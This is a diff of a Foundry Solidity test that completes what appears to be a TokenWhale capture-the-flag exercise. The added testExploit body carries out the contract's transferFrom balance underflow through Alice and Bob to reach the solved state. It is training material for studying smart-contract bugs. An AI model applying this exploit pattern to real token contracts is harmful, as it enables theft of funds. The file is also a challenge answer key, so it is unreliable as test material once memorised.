@@ -9,13 +9,11 @@ contract TokenWhaleTest is Test {
     TokenWhale public tokenWhale;
     ExploitContract public exploitContract;
     // Feel free to use these random addresses
-    address constant Alice = address(0x5E12E7);
-    address constant Bob = address(0x5311E8);
-    address constant Pete = address(0x5E41E9);
-
+    address public immutable Alice = makeAddr("Alice");
+    address public immutable Bob = makeAddr("Bob");
     function setUp() public {
         // Deploy contracts
-        tokenWhale = new TokenWhale(address(this));
+        tokenWhale = new TokenWhale(Alice);
         exploitContract = new ExploitContract(tokenWhale);
     }
 
@@ -23,7 +21,13 @@ contract TokenWhaleTest is Test {
     // Use vm.startPrank and vm.stopPrank to change between msg.sender
     function testExploit() public {
         // Put your solution here
-
+        vm.prank(Alice);
+        tokenWhale.transfer(Bob, 510);
+        vm.prank(Bob);
+        tokenWhale.approve(Alice, 1000);
+        vm.prank(Alice);
+        tokenWhale.transferFrom(Bob, Bob, 500);
+        assertEq(tokenWhale.isComplete(), true);
         _checkSolved();
     }
 
